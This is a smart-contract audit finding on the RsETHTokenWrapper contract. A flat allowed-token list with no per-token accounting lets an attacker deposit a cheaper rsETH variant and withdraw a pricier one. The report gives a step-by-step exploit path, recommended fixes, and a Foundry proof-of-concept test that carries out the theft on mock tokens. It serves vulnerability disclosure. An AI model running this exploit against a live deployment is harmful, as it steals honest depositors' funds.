Audit Report

## Title
Unrestricted Cross-Token Withdrawal Enables Theft of Higher-Value rsETH Variants — (`contracts/L2/RsETHTokenWrapper.sol`)

## Summary

`RsETHTokenWrapper` mints wrsETH 1:1 for any allowed token and allows burning wrsETH to redeem any allowed token, with no per-depositor or per-token accounting. When two allowed tokens trade at different prices, an attacker can deposit the cheaper token and withdraw the more expensive one, extracting the price difference from honest depositors. The contract's own `reinitialize` function confirms the multi-token design is intentional and deployed.

## Finding Description

The contract maintains a flat `allowedTokens` mapping and no per-token balance tracking:

```solidity
// L24
mapping(address allowedToken => bool isAllowed) public allowedTokens;
``` [1](#0-0) 

`_deposit` mints wrsETH 1:1 for any allowed token with no record of which token was deposited:

```solidity
// L134-141
function _deposit(address _asset, address _to, uint256 _amount) internal {
    if (!allowedTokens[_asset]) revert TokenNotAllowed();
    ERC20Upgradeable(_asset).safeTransferFrom(msg.sender, address(this), _amount);
    _mint(_to, _amount);
    ...
}
``` [2](#0-1) 

`_withdraw` burns wrsETH and transfers any caller-specified allowed token, with no check that the caller deposited that token:

```solidity
// L120-128
function _withdraw(address _asset, address _to, uint256 _amount) internal {
    if (!allowedTokens[_asset]) revert TokenNotAllowed();
    _burn(msg.sender, _amount);
    ERC20Upgradeable(_asset).safeTransfer(_to, _amount);
    ...
}
``` [3](#0-2) 

Both entry points are public with no access control: [4](#0-3) 

A second allowed token is explicitly added via `reinitialize`, confirming the multi-token state is a live deployment scenario: [5](#0-4) 

The only guard is `allowedTokens[_asset]`, which passes for both tokens. No oracle, no peg check, no per-token balance enforcement exists anywhere in the contract.

**Exploit path:**
1. Wrapper holds 100e18 tokenA (worth 1.05 ETH each), deposited by honest users.
2. Attacker acquires 100e18 tokenB (worth 1.00 ETH each) on a DEX.
3. Attacker calls `deposit(tokenB, 100e18)` → receives 100e18 wrsETH.
4. Attacker calls `withdraw(tokenA, 100e18)` → receives 100e18 tokenA (worth 105 ETH).
5. Net profit: 5 ETH. Honest tokenA depositors now find only tokenB in the wrapper; subsequent `withdraw(tokenA, ...)` calls revert due to insufficient tokenA balance.

## Impact Explanation

**Critical — Direct theft of user funds.** Honest depositors of the higher-value token lose the price spread to the attacker. The attack scales linearly with the price spread and the tokenA balance held by the wrapper. Victims cannot recover their original token; they are left with the cheaper variant or face a revert. This matches the allowed impact: *"Direct theft of any user funds, whether at-rest or in-motion."*

## Likelihood Explanation

High. The `reinitialize` function confirms the multi-token design is intentional and live. [5](#0-4) 
rsETH bridge variants (e.g., LayerZero OFT vs. native bridge) routinely trade at non-zero spreads on L2 DEXes due to bridge latency and liquidity differences. The attack requires no special role, no flash loan, no oracle manipulation — only a price difference between two tokens the contract already supports. It is repeatable as long as a spread exists.

## Recommendation

1. **Simplest fix:** Allow only a single underlying token per wrapper instance. Remove `reinitialize` and `addAllowedToken`, or enforce a single-token invariant.
2. **Per-token accounting:** Track each user's deposited token and amount; enforce that `withdraw(tokenA)` can only be called by users who deposited tokenA.
3. **Peg enforcement:** At withdrawal time, query a trusted on-chain price source and revert if the requested token's price deviates from the deposited token's price beyond a tight tolerance (e.g., 0.1%).

## Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "contracts/L2/RsETHTokenWrapper.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockToken is ERC20 {
    constructor(string memory name) ERC20(name, name) {
        _mint(msg.sender, 1000e18);
    }
}

contract WrapperExploitTest is Test {
    RsETHTokenWrapper wrapper;
    MockToken tokenA; // "expensive" rsETH variant
    MockToken tokenB; // "cheap" rsETH variant
    address admin = address(0xAD);
    address honest = address(0x1);
    address attacker = address(0x2);

    function setUp() public {
        tokenA = new MockToken("rsETH_OFT");
        tokenB = new MockToken("altRsETH");

        wrapper = new RsETHTokenWrapper();
        vm.prank(admin);
        wrapper.initialize(admin, address(0xBB), address(tokenA));

        // Admin adds second allowed token
        vm.prank(admin);
        wrapper.reinitialize(address(tokenB));

        // Honest user deposits 100 tokenA
        tokenA.transfer(honest, 100e18);
        vm.startPrank(honest);
        tokenA.approve(address(wrapper), 100e18);
        wrapper.deposit(address(tokenA), 100e18);
        vm.stopPrank();

        // Attacker acquires 100 tokenB (cheaper on market)
        tokenB.transfer(attacker, 100e18);
    }

    function testExploit() public {
        // Attacker deposits cheap tokenB
        vm.startPrank(attacker);
        tokenB.approve(address(wrapper), 100e18);
        wrapper.deposit(address(tokenB), 100e18);

        // Attacker withdraws expensive tokenA
        wrapper.withdraw(address(tokenA), 100e18);
        vm.stopPrank();

        // Attacker holds 100 tokenA (worth 105 ETH at 1.05 rate)
        assertEq(tokenA.balanceOf(attacker), 100e18);
        // Attacker spent 100 tokenB (worth 100 ETH at 1.00 rate)
        assertEq(tokenB.balanceOf(attacker), 0);

        // Honest user's tokenA is gone; withdraw reverts
        vm.prank(honest);
        vm.expectRevert(); // ERC20: transfer amount exceeds balance
        wrapper.withdraw(address(tokenA), 100e18);
    }
}
```
